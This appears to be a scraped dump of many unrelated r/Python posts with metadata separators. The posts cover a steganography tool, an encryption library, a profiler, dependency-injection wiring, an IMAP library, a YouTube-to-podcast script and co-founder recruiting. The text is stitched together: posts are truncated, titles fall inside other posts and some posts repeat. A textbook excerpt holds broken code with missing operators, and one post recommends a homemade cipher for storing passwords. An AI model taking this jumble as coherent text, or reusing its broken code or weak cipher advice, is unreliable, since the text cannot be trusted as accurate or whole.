And the stakes are : you owning 100% of a future-proof AI SAAS startup product. Basically a one way ticket to a secured financial future. And a near complete personal freedom. Earned through hard but smart, efficient &amp; stragically synergetic work.

&amp;#x200B;

There are some constraints tho : 

\- As devs, share a common stack. That is why I am posting here.

\- Being fluent at least in English, and in a non-English language.

\- We'll make no bones about it : we are selective of impressive &amp; experienced profiles to ensure everybody benefits from the group and nobody is weighting it down.

&amp;#x200B;

Interested? Comment or send me a message. Cheers!

Hidden in plain sight

&amp;#x200B;

&amp;#x200B;

Hi!

Recently i've been working on a steganography project I called Steganos.

I've just now completed the project and added a Graphical Interface.

&amp;#x200B;

A little about the project:

* The project works by hiding information inside either new or preexisting images
* There are currently 2 modes: Blatant and Stegano. Blatant creates a new image consisting of colorful pixels on a black background. Not very subtle, but it can hold a lot of information. Stegano mode works on preexisting images and only slightly modifies a few pixels. Really subtle, can't hold all that information

&amp;#x200B;

You can find the project here:

* [Github](https://github.com/ZenT3600/Steganos) \- (Source code)
* [My Website](https://www.matteoleggio.it/joomla/en/products.html) \- (Binaries)

&amp;#x200B;

All suggestions and questions are more than welcome. I'd love to see what you people have to say about this.

Sincerely yours

As a python programmer for the last few years, I really appreciate how convenient python is. So, like many others, it came across my mind to use python as a shell. I searched it up and many people have already talked about it. The main problem is that the syntax is very "clunky", running executables is \`subprocess.call\`, moving files is \`shutil.move\`, etc.

With that in mind, I thought of a different idea. What if the shell had two modes, normal mode, and scripting mode? When in normal mode, it would be identical to bash, zsh, sh, etc. However, when in scripting mode, you would be running python code. When you are in the scripting mode, you would call executables by saying call("command"). This would be the best of both worlds, making it easier to use bash like normal but also simple to script. You would also be able to move from scripting to normal mode easily, so you can switch seamlessly.

What do you guys think about this? If enough people actually think this is a good idea, I'll comment a GitHub page with a simple prototype and demonstration.""|||** ALL YOU COLLEGE FOOTBALL RECRUITING NUTS OUT THERE *|||Python|||1|||3|||1602629355|||""Heres a short script to scrape 247sports player rankings for a given range of years and given player count.

For the last 5-6 months, I've been working on a cryptographic library called [`PyFlocker`](https://github.com/arunanshub/pyflocker). It allows you to use the best features of [`PyCryptodome(x)`](https://github.com/Legrandin/pycryptdome) and [`pyca/cryptography`](https://github.com/pyca/cryptography).

This library was created with a simple goals in mind:

* a single, stable API to support both the libraries.
* Developer friendly (no more worrying about different APIs for different libraries) 
* Less verbose
* [Improvement over the existing tools present in the backend.](https://github.com/arunanshub/pyflocker/blob/b34757802555cd6915a402528cbe588afd13067b/pyflocker/ciphers/backends/cryptography_/AES.py#L55) (AES-EAX is not present in `pyca/cryptography` natively, but you don't have to worry about that)

And the biggest reason of all:

* A file encryption solution, that is fast, really fast.

Timings:

* `PyFlocker` takes 2.611 seconds with backend `pyca/cryptography` (taking into account the time spent in [performing a key derivation](https://github.com/arunanshub/pyflocker/blob/b34757802555cd6915a402528cbe588afd13067b/pyflocker/locker.py#L225).
* `OpenSSL` takes 3.234 seconds
* `GnuPG` takes 4.109 seconds

You can clearly see the speed difference here. For additional info, here is the hardware and software I used for the benchmark:

    Processor: Ryzen 7 3750H
    RAM: 16GB DDR4 2400MHz
    OS: Manjaro XFCE 20.1
    File: 802MB binary file full of 'aaaaaaaaaaaaaaaaaaaaa' repeated over and over.

This library can also be downloaded from [PyPI](https://pypi.org/project/PyFlocker).

I have been developing and maintaining a python app to run and rebalance a portfolio insurance strategy. I started this from reading the [blog posts on Universa Investments](https://www.universa.net/riskmitigation.html). Since I have some small amount of money in 401k, I decided to give that a test drive. 

&amp;#x200B;

I couldn't use options in my 401k, so instead I am using two ETFs. one of them is the portfolio, which can be SPY, QQQ, or some other index fund. the other one, is VXX, serves as the insurance. My idea is to constantly rebalance them to maintain a fixed ratio between the two. I wrote some python script to run the calculations and tell me if I need to trade in order to rebalance. Since then I have been maintaining them, adding tests, and adding some small features over time.

&amp;#x200B;

Right now it sits in my private repo on github. Are you folks interested in this kind of projects? I am happy to open up the code and collaborate if anyone wants to.

If you haven't heard of Austin before, it is an open source frame stack sampler for CPython, distributed under the GPLv3 license. It can be used to obtain statistical profiling data out of a running Python application without a single line of instrumentation. This means that you can start profiling a Python application straight away, even while it's running on a production environment, with minimal impact on performance.

The simplest way of using Austin is by piping its output to FlameGraph for a quick and detailed representation of the collected samples.

Austin is a pure C application that has no other dependencies other than the C standard library. Its source code is hosted on GitHub at

https://github.com/P403n1x87/austin

The README contains installation and usage details, as well as some examples of Austin in action. Details on how to contribute to Austin's development can be found at the bottom of the page.

Austin can be installed easily on the following platforms and from the following sources:

Linux:

* Snap Store
* Debian repositories

macOS:

* Homebrew

Windows:

* Chocolatey
* Scoop

Austin is also simple to compile from sources as it only depends on the standard C library, if you don't have access to the above-listed sources.

Besides support for Python 3.9, this new release of Austin brings a considerable performance enhancement that allows it to sample up to 8 times faster than previous versions. But please do read on until the end to find out about some new tools that take advantage of all the key features of Austin.

Due to increasing popularity, the sample Python applications that were included in the main repository have been moved to dedicated projects on GitHub. The TUI can now be found at

https://github.com/P403n1x87/austin-tui

while Austin Web is now available from

https://github.com/P403n1x87/austin-web

They can both be installed easily from PyPI, but in order to use them, the Austin binary needs to be on the PATH environment variable. These projects now rely on the austin-python Python package that provides a Python wrapper around Austin. If you are considering making your own profiling tool based on Austin, this package can spare you from writing boilerplate code, so it's worth having a look at it at

https://github.com/P403n1x87/austin-python

The documentation is hosted on RTD at

https://austin-python.readthedocs.io/en/latest/

Finally, I am happy to announce the release of pytest-austin, a plugin for pytest that allows you to set up performance regression testing by simply decorating your existing pytest test suite. The plugin launches Austin to profile your test runs, meaning that no further instrumentation is required. For more details, check out the project on GitHub

https://github.com/P403n1x87/pytest-austin

Like the other Austin tools, pytest-austin can be installed easily from PyPI.

You can stay up-to-date with the project's development by following Austin on Twitter (https://twitter.com/AustinSampler).""|||I improved my last program. 3 days ago i made a post showing a program i made, that organize your files.

I am working on a small project, and i'm having a problem.

I have a dataFrame which has 3 columns: Name, Value, Description.

&amp;#x200B;

|Name|Value|Description|
|:-|:-|:-|
|a|1999|good|
|a|46|bad|
|b|75|regular|
|b|30|regular|
|c|236|regular|
|c|1555|good|
|a|566|bad|
|a|55|bad|
|c|3222|regular|
|c|123|good|
|b|355|godd|

&amp;#x200B;

What i want to do is to take each values by their Name and run tests on them (for instance, sum, average, etc') and then remove the rows which fail those tests. 

The results should be that if a Value from "a" is bigger then 900, then it should be dropped.

I couldn't really understand what is the best way to do it.

I was thinking about for loop, but i couldn't make it work.

Thank you in advance.""|||Tuesday megathread: Advanced questions|||Python|||1|||0|||1602583240|||""Have some burning questions on advanced Python topics? Use this thread to ask more advanced questions related to Python.

&amp;#x200B;

If you want to learn to program but you do not really have time, or you do not know where to start, stunned by the amount of information there is or you just need someone to push you, keep reading ...

&amp;#x200B;

Usually when people solve problems, they do a quick search on Google or YouTube, start reading books, watching videos or entering forums and groups to get an answer from others. This process is not always effective, and often does not solve the problem, because real problems have no magic solutions.

&amp;#x200B;

In addition, these courses of action waste a lot of resources in the brain, mainly because of the amount of information that needs to be filtered and understood whether it is relevant to your situation or not.

&amp;#x200B;

But, if you know someone who has already struggled with the same problems and dealt with the situation you are in right now, that person will be able to help you reach your goal a few times faster than the time it will take you to explore and reach solutions yourself, because he/she has already researched and reached them. You do not have to bang your head against the wall.

&amp;#x200B;

This is why every beginner needs a mentor. There is no need to reinvent the wheel, you just have to do what your mentor tells you to do.

&amp;#x200B;

If you find yourself losing momentum and getting stuck a lot, not knowing what to do next, confused by the buzzwords or you just want to be held accountable, a mentor may be what you need.

- Refine my python script to search for only the most relevant information (like if you searched how many ppl have gotten miss rona it would only return a number with the source. Rather than a whole paragraph.

I have hated this crappy Windows 10 so much, this is so much of a pain for a student to sit for a whole day, only to get no result. Maybe Linux would have been better.

There are so many dead Anaconda icons in Start menu - it wouldn't work by any means, neither show the directory it should be pointing to, and no right click menu too.

I really enjoy watching lectures and interviews on Youtube. And I realized that most of the educational content I consume doesn't actually require the visual aspect of it, just the audio is enough. So I always had this idea of extracting the audio and listen it as an audiobook or a podcast. At first I thought about downloading the audio and uploading it on my phone and listening in the native player, But a podcast player is better for this. It can have a description, and the app saves where I am if I have to pause the it and I can also change the speed and cut the silences. 

At first I was doing this manually, but it got tiresome, so I tried to automate the process. At the beginning, I automated just a few parts of it. I used youtube-dl to download the video, and ffmpeg to extract the audio. Then I would manually upload into dropbox, get the direct link of the mp3 and create an rss using the website Huff Duff. This site takes audio links and create a simple rss, so it was all good.

But, still, I wanted listen so many things that I had to improve this idea. I sat one Sunday and for exactly 8 hours of work and a lot of headaches I now have a working program. I just need to use the command "podtube video\_url" and it will automatically download the video, process it, send it to the cloud and update my rss. I don't even see it, it just works. I just copy the link and in a few minutes my podcast app shows me a notification saying that the "mvpetri personal files podcast has been updated"!

The code is a mess, though. I made it in August 30 and I bet I won't be able to troubleshoot if I do something wrong. If it gets an error it doesn't handle it properly. It has hardcorded folder paths, api keys exposed as text, etc. But what it does is this:

&gt;It receives a URL from a video on youtube.  
It uses the youtube API to get the video title, description and meta data.  
If available, it downloads the audio file from youtube with youtube-dl. If not, it downloads the video and then extracts the audio with ffmpg.  
It uploads this audio to my personal dropbox account. I use dropbox because I have 16gb of free space there and I am able to get the direct link, necessary for the next step.  
It update a rss file, adding this new audio as a new episode. The title is the video title and the episode notes is the description of the video.  
It uploads the rss to my dropbox so my podcast app can update it as well and delete the local files on my computer.

# Why

If you want to see the effects of snowball effect (slow start and gradual increase in speed) and social proof (if it has many upvotes then I'll upvote it too).

Or if you want to  see how many upvotes the posts that eventually reach 30k+ get in their first hour, second hour etc, you can run this code and see it for yourself (So if your post gets the same amount of upvotes the first hour you'll know there's a high chance it's reaching hot soon).

TLDR : Own 100% of your company AND be part of a great co-founding team. How? Build a SAAS together with team members abroad and then own it in your home country's language.

\####

Dear everyone,

Are you ambitious with some Django knowledge? Looking to build a SAAS startup and maximize your own profit?

I am \^\^'

&amp;#x200B;

But ground truth indicates that Solo-Founders have extremely low odds of success. No wonders, it takes a huge amount of work and sustained effort to make it.

Co-Founders? Can be the best thing ever. Hard to find good ones. May bring the whole company down.. Conflicts between cofounders can look like a couple fight on the verge of divorce (seen in a co-working space!)

I thought about a possible solution. A way in which you could, as a Solo-founder, own 100% of your business. But work together with like-minded founders on your startup. Who all have a direct personal interest to make your startup work and profitable.

Localization.

&amp;#x200B;

I believe we can work together, on the same startup, but for different languages &amp; countries. Sharing code, marketing efforts, support and good times together. Owning 100% of our business at home.

I believe that this can dramatically improve everyone's odds of success. Everyone's interest would be to make everyone successful. All work is easier within a dynamic &amp; competent fellowship.

Obviously members will have to be well selected to ensure success. And there could be new types of problems arising. But as founders, solving problems is what we do. So we'll figure it out.

Overall, I think this is super worthy of a try. Especially versus the alternatives of being a wantrepreneur, and serial flash in the pan projects.

&amp;#x200B;

There are some constraints tho:

\- As devs, share a common stack. That is why I am posting here.

\- Being fluent at least in English, and best case scenario: also in a non-English language.

Interested? Comment or send me a message. [t.me/Jack\_Fr](https://t.me/Jack_Fr) on Telegram. BTW, I am French. Cheers!

&amp;#x200B;

PS: I have a strong proposition of a startup to make using cutting edge-AI I have some experience with. But as startuppers we must be unattached to our ideas. And be focused on solving real problems and overall success.

I've just released the last episode for my first season of "What does this package do?". Initially, it was to get people more acquainted with the Python Standard Library in short chunks.

It's got 5 episodes so far:

- [`collections.namedtuple`](https://www.youtube.com/watch?v=84BQng6a2H8): I love this little function, although it is quickly being replaced by `dataclass`. I still find it useful, because it can be very light in terms of footprint, and a lot of libraries still use it.
- [Enhanced Dictionaries](https://www.youtube.com/watch?v=I3ZnopcpYY0): I really find `defaultdict` to be one of the most useful functions that I use. I also covered `Counter`, because it turns out that you often need to count things.
- [`itertools`](https://www.youtube.com/watch?v=kdxEmrCFZ80): I could not cover all of `itertools`, because it is such a large library. However, I did try to cover a lot of the things that I found useful.
- [`pathlib`](https://www.youtube.com/watch?v=YwhOUyTxXVE): Another one of the libraries that I enjoy using, because it has such a rich API. Before, you'd need to convert some of the objects to strings in order to get them to work with other libraries, but now things have gotten a lot easier. This is one of the relatively _new_ packages in Python, and I wanted to bring more attention to it.
- [`contextlib`](https://www.youtube.com/watch?v=BzOc6AEvfh8): Contextlib is an interesting library. It's small and has a lot of interesting helper functions, decorators and classes that make creating context managers much easier.

So, with the first season complete, I wanted to introduce more of the _newer_ packages, as well as some powerful packages that don't get a lot of attention (but can be really handy in a pinch). So, with that in mind, what kind of packages would you like covered? I am also find with covering non-stdlib stuff if they are super stable.""|||It's About The Scary Mainloop, especially the one in Pygame|||Python|||1|||2|||1602431886|||""[removed]""|||in the database its : 'Barry' as email and 'Harris' as password the output is : [] 0 Email not found or Password incorrect.|||Python|||1|||2|||1602431015|||""[removed]""|||screen2text|||Python|||1|||9|||1602428505|||""I have made a script which takes a  screenshot and processes it for OCR and saves the output in txt format.

&gt;Reading  the docs was also confusing so I decided to write a program that  generated a truth table of all the parameters said to govern \_\_hash\_\_  generation for dataclasses and check the output generated in each case.

GridRoyale is a life simulation. It's a tool for machine learning researchers to explore social dynamics.

It's similar to Game of Life or GridWorld, except I added game mechanics to encourage the players to behave socially. These game mechanics are similar to those in the battle royale genre of computer games, which is why it's called GridRoyale.

The game mechanics, Python framework and visualization are pretty good-- The core algorithm sucks, and I'm waiting for someone better than me to come and write a new one. If that's you, please open a pull request.""|||Python Tutorial: Reverse a String|||Python|||1|||1|||1602402817|||""&amp;#x200B;

Main feature of this release is `wiring`. It helps to make dependencies injection from container into functions and method without pulling them into the container.

    from dependency_injector import containers, providers
    from dependency_injector.wiring import Provide
    
    
    class Container(containers.DeclarativeContainer):
    
        config = providers.Configuration()
    
        api_client = providers.Singleton(
            ApiClient,
            api_key=config.api_key,
            timeout=config.timeout.as_int(),
        )
    
        service = providers.Factory(
            Service,
            api_client=api_client,
        )
    
    
    def main(service: Service = Provide[Container.service]):
        ...
    
    
    if __name__ == '__main__':
        container = Container()
        container.config.api_key.from_env('API_KEY')
        container.config.timeout.from_env('TIMEOUT')
        container.wire(modules=[sys.modules[__name__]])
    
        main()  # &lt;-- dependency is injected automatically
    
        with container.api_client.override(mock.Mock()):
            main()  # &lt;-- overridden dependency is injected automatically

When you call `main()` function the `Service` dependency is assembled and injected automatically.

When doing a testing you call the `container.api_client.override()` to replace the real API client with a mock. When you call `main()` the mock is injected.  


**How does it help to integrate with other frameworks?**

Wiring helps to make precise injections regardless of the application structure. Unlike version 3, there is no need in pulling a function or class into a container. It gives a chance to make dependencies injection into existing application structure.

Example with Flask:

    import sys
    
    from dependency_injector import containers, providers
    from dependency_injector.wiring import Provide
    from flask import Flask, json
    
    
    class Service:
        ...
    
    
    class Container(containers.DeclarativeContainer):
    
        service = providers.Factory(Service)
    
    
    def index_view(service: Service = Provide[Container.service]) -&gt; str:
        return json.dumps({'service_id': id(service)})
    
    
    if __name__ == '__main__':
        container = Container()
        container.wire(modules=[sys.modules[__name__]])
    
        app = Flask(__name__)
        app.add_url_rule('/', 'index', index_view)
        app.run()

More examples:

* [Django](http://python-dependency-injector.ets-labs.org/examples/django.html)
* [Flask (extended)](http://python-dependency-injector.ets-labs.org/examples/flask.html)
* [Aiohttp](http://python-dependency-injector.ets-labs.org/examples/aiohttp.html)
* [Sanic](http://python-dependency-injector.ets-labs.org/examples/sanic.html)

**How does wiring work?**

To use wiring you need:

* **Place markers in the code.** Wiring marker specifies what provider to inject, e.g. `Provide[Container.bar]`. This helps container to find the injections.
* **Wire the container with the markers in the code.** Call `container.wire()` specifying modules and packages you would like to wire it with.
* **Use functions and classes as you normally do.** Framework will provide specified injections.

Wiring works uses introspection. When you call `container.wire(modules=[...], packages=[...])` framework will discover arguments of all functions and methods in the specified packages and modules. If the value of an argument is a marker, such function or method will be patched by injecting decorator. This decorator will prepare and inject needed dependencies instead of markers into original function.

**Backward compatibility**

Version 4 is completely compatible with version 3.

I play a game called Apex Legends and I think it would be a cool project (if possible) to be able to keep track of all my stats in the game with python (k/d, wins, losses, damage done, etc.).

if it is possible could someone point me in the right direction so I could start learning about it and do some research.

I also think it would be cool to eventually make a GUI for it.

But to start I think it would be cool just to have it update a excel sheet or notebook or something similar.

If you cant tell by the post I am a beginner, but I have been trying to think of a project that would be really cool to do and would keep me working on my coding.

I want to show you my lib, that let you works with your email box instead works with IMAP specification: **imap\_tools**

[https://github.com/ikvk/imap\_tools](https://github.com/ikvk/imap_tools)

**Features:**

* Parsed email message attributes
* Query builder for searching emails
* Work with emails in folders (copy, delete, flag, move, seen)
* Work with mailbox folders (list, set, get, create, exists, rename, delete, status)
* No dependencies

Lib can solve most basic tasks with mailbox.

Our company using imap\_tools since 2017 in prod.

I write it post for peoples that works with mailbox on python.

I hope imap\_tools make your life simpler.

**Quick examples:**

    import datetime as dt
    from imap_tools import MailBox, AND, OR, NOT
    
    with MailBox('imap.mail.com').login('test@mail.com', 'pwd', 'INBOX') as mailbox:
    
        # get list of email subjects from INBOX folder
        subjects = [msg.subject for msg in mailbox.fetch()]
    
        # move all messages from current folder (INBOX) to folder2
        mailbox.move(mailbox.fetch(), 'INBOX/folder2')
    
        # get list with INBOX subfolders names
        inbox_subfolders = [folder_info['name'] for folder_info in mailbox.folder.list('INBOX')]
    
        # get bodies of emails that (date not in (2000-1-1, 2000-1-2) AND flagged AND subject contains "")
        criteria = AND(NOT(OR(date=[dt.date(2000, 1, 1), dt.date(2000, 1, 2)])), flagged=True, subject='')
        for msg in mailbox.fetch(criteria, charset='utf8'):
            body = msg.text or msg.html

**Lib creation reasons:**

* Excessive low level of imaplib library.
* Other libraries contain various shortcomings or not convenient.
* Open source projects make world better.

I've wanted to play around with Click, explore GitLab's full capacity, and publish something on PyPI for a while now. Despite pomodoro timers being quite uninspired at this point, I saw an opportunity to hit all of those goals at once. I'd be able to develop it quickly and move onto really exploring GitLab's CI/CD offerings.

While putting this project together, I tried to pretend it was a huge open source project already. This means multiplatform testing, linting, and formatting checks are part of the CI/CD pipeline, all work starts with an issue and ends with a merge request, and SemVer/Conventional Commits are followed (mostly) religiously. Additionally, I leveraged `python-i18n` to provide the opportunity for localization.

In the end, I think the best offer from this project is not the product itself, but rather, the example the repository sets. If you're a beginner or even an intermediate Pythonista, looking through the meta files (`setup.py`, `.gitlab-ci.yml`, `tox.ini`, etc) could go a long way into upping the quality of your code using automation.

Last year I was making an encryption system(Not sure if that is the correct term for it) but the problem was that encrypting and decrypting messages by hand took a long time. I tried coding an encryptor in batch but it was too hard and I dont think batch was made for stuff like this anyways. So I thought I could put my python knowledge to the test.

Before that tho, let me talk about why I want to make an encryption system in the first place. The main reason is passwords. I have a bad memory so memorizing passwords is hard for me but I dont want to have 1 password for everything. What I ended up doing is creating a pattern. For example, every one of my passwords have the following format "NiceCar" + The Name of The Service + "$666". So my password on reddit would be "NiceCarReddit$666". Obviously those are just examples and not what I use. The problem with this is if somehow one of my passwords got leaked and someone recognized the pattern he would have access to all my accounts. Thus the encryption system. What I plan on doing is make it hard enough for people to decrypt so that I can store all my passwords in a .txt file for example and no one would know what it means. There are probably people out there who would be able to decode it in its final form but that isnt my concern unless I am involved with the FBI. I think that if a hacker got my .txt file he or she wouldnt bother trying to decrypt it since I am not an important target. Now onto the details :)

I started coding it last week and it took me around 3-4 hours to make the encryptor and around 2 hours to make the decryptor. If I input "I am gonna post this on reddit." the output will look like this:

    9;1:13;7:15:14:14:1;16:15:19:20;20:8:9:19;15:14;18:5:4:4:9:20/

and if I use that as the input for the decryptor it will be:

     i am gonna post this on reddit.

It has no way of defining capitalization thats why everything is just lower case. It also supports no special characters and must end with a ".".

Here is the source code cuz I know I am gonna get asked about this: [Encryptor](https://pastebin.com/gwK6ZxNe) and [Decryptor](https://pastebin.com/gpxYgzi3). I would appreciate constructive feedback about the code. This was only my level 1 encryption system, the following ones will be harder but as long as one person was able to decrypt a message for the other systems I am gonna upload its source code.""|||I made a calculator kind of|||Python|||1|||3|||1602248884|||""This is one of the first things I have made in Python.

But does it really matter? When recommending to a beginner they're not going to dealing with massive data sets with millions of pieces of information. 

Who cares if python is 0.01 seconds slower than Java? I find it mildly annoying when beginners are discouraged from python because in these top 10 videos, the host says it slow and everything and that person ends up taking C++ and quits programming altogether later that week, as I have seen a lot, even with my friends. Even I was discouraged from python several years ago, because people kept bashing it for the little stuff, so I ended up learning java, which made me pull my hair out in the beginning.

[https://github.com/Hillo111/CGA/blob/master/textbasedanimation.py](https://github.com/Hillo111/CGA/blob/master/textbasedanimation.py)

I have no idea where the idea for this came from. But, I've always been fascinated by ASCII art and so I made a tool to create it. And I'm also taking a semester in animation and I guess that's what inspired me to make it animated. Originally I used PyGame to search through the image to get the pixel values, but then I switched over to PIL and found out that libraries that are specifically designed for image processing are much better at image processing than those that aren't.

Anyways, have fun with the tool, and copy what you've made with it over to the comments.""|||Cap'em: Highly configurable resource limit tracker|||Python|||1|||0|||1602228076|||""Say you have a resource called Email.

This is a project I started last year when conducting online hackathons was not a thing, but ever since this pandemic, online events are the only things we have left.

Features:

The API consists of User Authentication, Team forming and project submission.

* A User can register as a participant in the hackathon and form a new team
* Or Join an already created one.
* When a new team is created a token is generated, which can be used by other participants to join the team
* It only allows 4 members per team
* One team can submit a project with the project\_name, git\_url, description, etc.

&amp;#x200B;

Feel free to clone the code and use it for your own event.

I have also added some proper documentation of end points in the README file and a "Deploy on Heroku" button in the README file for quick deployment.

I am currently loading the Utzoo articles from my internal PostgreSQL database into the online version at [UsenetArchives.com](https://usenetarchives.com/), about 20% done now. Loading should be completed by the end of the day, but you can already read hundreds of thousands of those old posts.

For those who do not want to deep dive into the details, here is a high-level description of the entire process:

1. Henry Spences stores early internet posts on Magnetic Tapes

* 2. Downloaded copy of tar files is extracted into millions of flat files
* 2. Testing Headers and Body example of each of the flat file posts
* 3. Writing and running Python code to parse out all header and body fields
* 5-6. The Python script auto creates tables and indexes
* 7. The result: PostgreSQL fully searchable database of all lost Usenet posts Feb 1981 and June of 1991

[https://github.com/ShauryaAg/dsc-webathon](https://github.com/ShauryaAg/dsc-webathon)


This is a project I started last year when conducting online hackathons was not a thing, but ever since this pandemic, online events are the only things we have left.

Features:

The API consists of User Authentication, Team forming and project submission.

* A User can register as a participant in the hackathon and form a new team
* Or Join an already created one.
* When a new team is created a token is generated, which can be used by other participants to join the team
* It only allows 4 members per team
* One team can submit a project with the project\_name, git\_url, description, etc.


Feel free to clone the code and use it for your own event.

I am writing a module for work that will facilitate batch meshing, mesh editing and general fea input file parsing and writing.  specifically this is for LS Dyna.

&amp;#x200B;

anyways:

I have a single module that I have simplified with a single class that contains all of my functions.  I import from module import class 1 into different scripts to run batch process's.  

is this any different than taking out the class and writing all of the functions and global variables into the module and simply importing the module?

&amp;#x200B;

I am going to document and refactor today and I wanted to some feedback as to the most simple and effective design.

Although this function does what it sets out to do, it can be simplified. Because the return statement can return the value of an expression, you can eliminate the result variable and rewrite the function as: def sum(num1, num2):  return num 1 + num 2 This version of the function does not store the value of num1 + num2 in a variable. Instead, it takes advantage of the fact that the return statement can return the value of an expression. This version of the function does the same thing as the previous version, but in only one step. How to Use Value-Returning Functions Value-returning functions provide many of the same benefits as void functions: they simplify code, reduce duplication, enhance your ability to test code, increase the speed of development, and ease the facilitation of teamwork. Because value-returning functions return a value, they can be useful in specific situations. For example, you can use a value-returning function to prompt the user for input, and then it can return the value entered by the user. Suppose youve been asked to design a program that calculates the sale price of an item in a retail business. To do that, the program would need to get the items regular price from the user. Here is a function you could define for that purpose: def get\_regular\_price():  price = float(input("Enter the item's regular price: "))  return price Then, elsewhere in the program, you could call that function, as shown here: # Get the item's regular price. 322 reg\_price = get\_regular\_price() When this statement executes, the get\_regular\_price function is called, which gets a value from the user and returns it. That value is then assigned to the reg\_price variable. You can also use functions to simplify complex mathematical expressions. For example, calculating the sale price of an item seems like it would be a simple task: you calculate the discount and subtract it from the regular price. In a program, however, a statement that performs this calculation is not that straightforward, as shown in the following example. (Assume DISCOUNT\_PERCENTAGE is a global constant that is defined in the program, and it specifies the percentage of the discount.) sale\_price = reg\_price  (reg\_price \* DISCOUNT\_PERCENTAGE) At a glance, this statement isnt easy to understand because it performs so many steps: it calculates the discount amount, subtracts that value from reg\_price, and assigns the result to sale\_price. You could simplify the statement by breaking out part of the math expression and placing it in a function. Here is a function named discount that accepts an items price as an argument and returns the amount of the discount: def discount(price):  return price \* DISCOUNT\_PERCENTAGE You could then call the function in your calculation: sale\_price = reg\_price  discount(reg\_price) This statement is easier to read than the one previously shown, and it is clearer that the discount is being subtracted from the regular price. Program 5-22 shows the complete sale price calculating program using the functions just described.""|||ipo|||Python|||1|||3|||1602110482|||""An IPO chart is a simple but effective tool that programmers sometimes use for designing and documenting functions.

For example, Figure 5-25 shows IPO charts for the get\_regular\_price and discount functions you saw in Program 5-22.""|||how do i access a dictionary that is inside a list|||Python|||1|||2|||1602109941|||""[removed]""|||How does a CLI tool work conceptually if created with Python?|||Python|||1|||7|||1602108272|||""So hypothetically I've been tasked with creating some kind of CLI tool that a user, anybody, could "npm install or yarn or brew" and then be able to have commands through the CLI that will then download another software (which we'll package with our module) that then will act as an accelerator (cron job) that polls user machine data and then sends it up via API to another API we have, which then we process and sanitize with our own business logic.

Recently  I started on a new Django project and wanted to track a few occasional  events, like a new user registering for the app or when a users data  was modified by a recurring task. My criteria:

* I wanted the logging solution to be simple to implement
* I wanted it to be compatible with any python framework
* I just wanted application-level logs
* I wanted a decent mobile experience

Most of the logging solutions I found on the market were overkill for my use case (*ex: Logglys painfully outdated Django documentation*). To streamline things as much as possible  for  this project and future ones  I created the **slacklogger** package. [You can find the GitHub page here](https://github.com/aleksandr-smechov/slacklogger).

It does as the name suggests: it logs app-level events in a Slack channel of your choice.

Presentation page: [https://www.tastoid.com/about/](https://www.tastoid.com/about/)

It has been more than three years than I have been working on this dream project. I had to learn everything from scratch (Python, Elasticsearch, Django...) with [this idea](https://www.reddit.com/r/Startup_Ideas/comments/91exw6/a_site_that_gives_personalized_suggestions_for/) in mind of creating a web app which would provide **personalised movie and TV recommendations**. I am really passionate about cinema, so this was my hobby project.

Many time I hit my head against the wall, many time I had to get my hand dirty. It was a real enriching experience. I had to make concessions such as resorting to Native JS rather than a front-end framework.

I feel relieved, but, at the same time, exhausted of working alone on this project. Even more so as I have new challenges (marketing the idea, creating a community...). The reason I am writing this post is to encourage people to believe in their dream. I would like to thank this community for being positive and helpful during my journey.

Please let me know if you have any question or suggestion/comment regarding my web app (UX, accuracy of the recommendations...). In return, I am open to any question as I want to share with you the lessons I have learned.

Features:

* A place to intuitively organize and **track the titles** you have completed.
* **Detailed stats** in your profile (e.g. [my profile](https://www.tastoid.com/user/1/vonmaster/)).
* **Personalized recommendations** (everytime you rate 5 movies above 4 stars or add them to your favorites).
* **Explore titles** using a descriptive search engine (i.e. ["nostalgic coming-of-age movie teenagers 60s"](https://www.tastoid.com/search/movies/?search_multi_match=nostalgic%20coming-of-age%20movie%20teenagers%2060s)) and narrowing results using tags such as the mood or the plot type (i.e. ["#atmospheric" ](https://www.tastoid.com/search/?Mood=Atmospheric) ).
* **Filter results** by streaming platform (Netflix...).
* And many more (reviews, lists, calendar...).

 Made a YouTube scraping package using Selenium with automated dependencies setup on Windows and MacOS.

 Refactored code to follow Python best practices (f-strings, module/submodule using \_\_init\_\_.py, PEP-8 (mostly), automated tests, custom linter checks, extensive set up and API documentation, abstraction by encapsulating unnecessary info, and docstrings for exposed API)

 Here because I'm interested in community feedback. Is there anything I could improve? Is there a more efficient way to do something? My goal was to make the codebase very readable, so did it end up that way?

Package here: [GitHub](https://github.com/Shail-Shouryya/yt_videos_list), [PyPI](https://pypi.org/project/yt-videos-list/), [releases](https://github.com/Shail-Shouryya/yt_videos_list/releases)

**Longer background**

I started working on a project last year where I would scrape some metadata (title, link, video number) of all videos uploaded by a YouTube channel to take notes on videos I watched. It started off as a single .`py` file where I would go in and change parts of the code to run it on another channel, to a couple modules where I could run the program from the Python interpreter without having to remember to change 5-6 parts of the program, to eventually an [entire package](https://github.com/Shail-Shouryya/yt_videos_list/tree/master/python/dev).

The initial goal was just to make a script for me to get the videos of 2 channels I watched frequently so it'd be easy for me to take notes on the videos I watched, but I figured this was something that others would find useful too, so I tried to modularize it and make it as user friendly as possible.

This package uses Selenium, and since I wanted this package to be cross platform AND easy to use, I added additional logic ([check this submodule](https://github.com/Shail-Shouryya/yt_videos_list/tree/master/python/dev/download)) to automatically download the relevant Selenium drivers for whichever browsers you already have. This was super important since setting up Selenium was a nightmare for me the first time (you need to configure path variables if you download it from one place but not another, or you need to move it after you download it, or you need to unzip it, etc...), so the logic I added uses `curl` and `tar` to download the binaries directly and then places the binaries in a location where ***you*** don't need to configure anything.

I also added tests [here](https://github.com/Shail-Shouryya/yt_videos_list/tree/master/python/tests) (see the run\_tests.sh and run\_tests.bat files for an overview) that check to make sure the output files created by the program are consistent (uses hashes to compare expected file to output file) every time and across platforms. This was also a source of error initially since Windows uses CRLF line endings and \*nix typically use LF endings, so I \*thought\* that would require manual modification, but turns out it doesn't that required a bit of tinkering to get right ([this](https://github.com/Shail-Shouryya/yt_videos_list/commit/0fc42d504e662552232be33ae5fa0d005c0c5fab) is what I incorrectly did the first time, and [this](https://github.com/Shail-Shouryya/yt_videos_list/commit/63cb9660887627aa3f28c3385d23d9d775977d23) is the fix after I realized the problem, and [this](https://github.com/Shail-Shouryya/yt_videos_list/commit/fc278e3af1a944940996d2c5a164f8ed82184cf8) is the additional configuration you need to do to synchronize output for csv files).

